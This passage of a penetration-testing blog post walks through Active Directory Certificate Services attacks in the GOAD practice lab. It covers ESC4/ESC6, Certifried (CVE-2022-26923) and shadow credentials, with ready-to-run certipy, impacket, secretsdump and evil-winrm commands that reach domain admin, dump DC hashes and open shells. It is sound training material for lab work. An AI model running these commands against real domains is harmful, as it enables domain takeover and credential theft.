</pre></table></code></div></div><ul><li>Rollback the template configuration<div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy template <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-template</span> ESC4 <span class="nt">-configuration</span> ESC4.json
</pre></table></code></div></div></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_exploit_esc4.png" alt="adcs_exploit_esc4.png" /></p><h2 id="adcs---esc6">ADCS - ESC6</h2><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_esc6_mindmap.png" alt="adcs_esc6_mindmap.png" /></p><ul><li><p>As said on certipy page : <em>“ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template’s configuration.”</em></p><li><p>Because ESSOS-CA is vulnerable to ESC6 we can do the ESC1 attack but with the user template instead of the ESC1 template even if the user template got Enrollee Supplies Subject set to false.</p></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-target</span> braavos.essos.local <span class="nt">-template</span> User <span class="nt">-ca</span> ESSOS-CA <span class="nt">-upn</span> administrator@essos.local
certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 192.168.56.12
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_exploit_esc6.png" alt="adcs_exploit_esc6.png" /></p><ul><li>If you need to disable the EDITF_ATTRIBUTESUBJECTALTNAME2 attribute (because you want to try without it or just because <a href="https://github.com/ly4k/Certipy#esc6">this attack will no longer work on a up to date AD without esc10 vuln</a>), you could do as administrator on braavos the following commands:</ul><pre><code class="language-cmd">certutil –setreg policy\EditFlags –EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc &amp;&amp; net start certsvc
</code></pre><blockquote><p>This also mean that if you got an administrator access on the certificate server you can change this attribute to exploit ESC1 without being domain admin ;)</p></blockquote><ul><li>But now the exploit ESC6 no longer work, the user is not changed :)</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_exploit_esc6_nolongerwork.png" alt="adcs_exploit_esc6_nolongerwork.png" /></p><h2 id="certifried---cve-202226923">Certifried - CVE-2022–26923</h2><ul><li><p>Oliver Lyak found out a way to escalate privilege as a low privilege user into an active directory. This consist of change the dnsHostName property on a created computer. The idea look the same as samAccountName vulnerability, it is a confusion with name on authentication. Details are here : <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4</a></p><li><p>Create an account with a domain user and set a fake dns name as the domain controler.</p></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy account create <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-user</span> <span class="s1">'certifriedpc'</span> <span class="nt">-pass</span> <span class="s1">'certifriedpass'</span> <span class="nt">-dns</span> <span class="s1">'meereen.essos.local'</span>
</pre></table></code></div></div><ul><li>Request a certificate with the created computer on template Machine</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> <span class="s1">'certifriedpc$'</span>@essos.local <span class="nt">-p</span> <span class="s1">'certifriedpass'</span> <span class="nt">-target</span> braavos.essos.local <span class="nt">-ca</span> ESSOS-CA <span class="nt">-template</span> Machine
</pre></table></code></div></div><ul><li>Authenticate with the certificate as meereen (the dc)</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy auth <span class="nt">-pfx</span> meereen.pfx <span class="nt">-username</span> <span class="s1">'meereen$'</span> <span class="nt">-domain</span> essos.local <span class="nt">-dc-ip</span> 192.168.56.12
</pre></table></code></div></div><ul><li>Dump the ndts with the kerberos ticket we just get</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/certifried/meereen.ccache
secretsdump <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-just-dc-user</span> daenerys.targaryen ESSOS.LOCAL/<span class="s1">'meereen$'</span>@meereen.essos.local
</pre></table></code></div></div><ul><li>delete the created computer with a domain admin user</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy account delete <span class="nt">-u</span> daenerys.targaryen@essos.local <span class="nt">-hashes</span> <span class="s1">'aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a'</span> <span class="nt">-user</span> <span class="s1">'certifriedpc'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_exploit_certifried.png" alt="adcs_exploit_certifried.png" /></p><ul><li>Ok but now imagine you can’t dcsync with secretdump due to a security product on the dc, or you just want to get a shell directly on the DC. Let’s try to get a shell.<li>We got the TGT of the DC (exactly like in part 5 for samaccountname) so we will use impacket getST to impersonate the administrator and get a st to access the DC as administrator (see : <a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse">https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse</a>)</ul><blockquote><p>remember to use the good impacket pull request to use this, see part5 for installation (thx again to shutdown for the adds to impacket)</p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/certifried/meereen.ccache
python3 /opt/tools/myimpacket/examples/getST.py <span class="nt">-self</span> <span class="nt">-impersonate</span> <span class="s1">'administrator'</span> <span class="nt">-altservice</span> <span class="s1">'CIFS/meereen.essos.local'</span> <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> <span class="s1">'meereen.essos.local'</span> <span class="s1">'essos.local'</span>/<span class="s1">'meereen'</span>
</pre></table></code></div></div><ul><li>and now we can use our ticket</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/certifried/administrator@CIFS_meereen.essos.local@ESSOS.LOCAL.ccache
wmiexec.py <span class="nt">-k</span> @meereen.essos.local
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_exploit_certifried_shell.png" alt="adcs_exploit_certifried_shell.png" /></p><ul><li>We could also do the same thing but with winrm to be even more legit :)</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/certifried/meereen.ccache
python3 /opt/tools/myimpacket/examples/getST.py <span class="nt">-self</span> <span class="nt">-impersonate</span> <span class="s1">'administrator'</span> <span class="nt">-altservice</span> <span class="s1">'HTTP/meereen.essos.local'</span> <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> <span class="s1">'meereen.essos.local'</span> <span class="s1">'essos.local'</span>/<span class="s1">'meereen'</span>
</pre></table></code></div></div><blockquote><p>Note : Here we asked an altservice HTTP/meereen.essos.local for winrm usage</p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/certifried/administrator@HTTP_meereen.essos.local@ESSOS.LOCAL.ccache
evil-winrm <span class="nt">-i</span> meereen.essos.local <span class="nt">-r</span> ESSOS.LOCAL
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_exploit_certifried_shell_winrm.png" alt="adcs_exploit_certifried_shell_winrm.png" /></p><ul><li>and voilà :)</ul><h2 id="shadow-credentials">Shadow Credentials</h2><ul><li><p>Shadow credentials attack consist of using the GenericAll or GenericWrite privilege on a user or computer to set up the attribute msDS-KeyCredentialLink. explanations <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">here</a></p><li><p>You can get the dacl movement on shutdown (@_nwodtuhs) website, the hacker recipes : <a href="https://www.thehacker.recipes/ad/movement/dacl">https://www.thehacker.recipes/ad/movement/dacl</a></p></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_shadow_credentials.png" alt="adcs_shadow_credentials.png" /></p><ul><li><p>This attack is very usefull when you got Write on another user.</p><li>With genericWrite you can only do:<ul><li>Target Kerberoasting : add an SPN to a user, do a kerberoasting, unset the spn. But the user password must be weak to the kerberoasting attack work.<li>Set up a logon script : change ldap parameters to set up a logon script. but it implies that the user log to his computer, an smb server or a share to offer the script and setup a script that bypass the security solutions in place)<li>shadow credentials : the attack we want to do, we need a cetificate service on the domain</ul><li>With GenericAll you can :<ul><li>ForceChangePassword : but on a real pentest you don’t want to block a user by changing his password. And this is not very stealthy too. So if you can do another way this is fine :)<li>All the attacks available in the genericWrite part.</ul></ul><p>So if ADCS is enabled on the domain, and we got write privilege on msDS-KeyCredentialLink, we can do the shadow credentials attack to get a direct access on the user account. And this seems to be the better idea in this case on a real pentest.</p><ul><li>Shadow credentials is now include with certipy (this attack can also be done with <a href="https://github.com/ShutdownRepo/pywhisker">pywisker</a> )</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy shadow auto <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-account</span> <span class="s1">'viserys.targaryen'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_shadow_credentials_exploit.png" alt="adcs_shadow_credentials_exploit.png" /></p><ul><li>And we can do the same from viserys to jorah</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy shadow auto <span class="nt">-u</span> viserys.targaryen@essos.local <span class="nt">-hashes</span> <span class="s1">'d96a55df6bef5e0b4d6d956088036097'</span> <span class="nt">-account</span> <span class="s1">'jorah.mormont'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_shadow_credentials_exploit2.png" alt="adcs_shadow_credentials_exploit2.png" /></p><p>Next time we will have fun with MSSQL (<a href="/posts/GOADv2-pwning-part7/">Goad pwning part7</a>) in the lab :)</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ad/'>AD</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ad/" class="post-tag no-text-decoration" >AD,</a> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab,</a> <a href="/tags/certipy/" class="post-tag no-text-decoration" >certipy,</a> <a href="/tags/adcs/" class="post-tag no-text-decoration" >adcs</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=GOAD - part 6 - ADCS - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part6/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=GOAD - part 6 - ADCS - Mayfly&u=https://mayfly277.github.io/posts/GOADv2-pwning-part6/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=GOAD - part 6 - ADCS - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part6/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/GOADv2-pwning_part1/">GOAD - part 1 - reconnaissance and scan</a><li><a href="/posts/GOADv2-pwning-part2/">GOAD - part 2 - find users</a><li><a href="/posts/GOADv2-pwning-part3/">GOAD - part 3 - enumeration with user</a><li><a href="/posts/GOADv2-pwning-part4/">GOAD - part 4 - poison and relay</a><li><a href="/posts/GOADv2-pwning-part5/">GOAD - part 5 - exploit with user</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE-2022-35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/GOADv2-pwning_part1/"><div class="card-body"> <span class="timeago small" >Jul 3<i class="unloaded">2022-07-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 1 - reconnaissance and scan</h3><div class="text-muted small"><p> The lab is now up and running Goad introduction, let’s do some recon on it. Enumerate Network We will starting the reconnaissance of the Game Of Active Directory environment by searching all the ...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part2/"><div class="card-body"> <span class="timeago small" >Jul 4<i class="unloaded">2022-07-04T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 2 - find users</h3><div class="text-muted small"><p> We have done some basic reconnaissance on Goad pwning part1, now we will try to enumerate users and start to hunt credentials. Enumerate DC’s anonymously With CME cme smb 192.168.56.11 --users...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part3/"><div class="card-body"> <span class="timeago small" >Jul 7<i class="unloaded">2022-07-07T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 3 - enumeration with user</h3><div class="text-muted small"><p> We found some users on Goad pwning part2, now let see what we can do with those creds. User listing When you get an account on an active directory, the first thing to do is always getting th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/GOADv2-pwning-part5/" class="btn btn-outline-primary" prompt="Older"><p>GOAD - part 5 - exploit with user</p></a> <a href="/posts/GOADv2-pwning-part7/" class="btn btn-outline-primary" prompt="Newer"><p>GOAD - part 7 - MSSQL</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/M4yFly">mayfly</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE 2022 35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
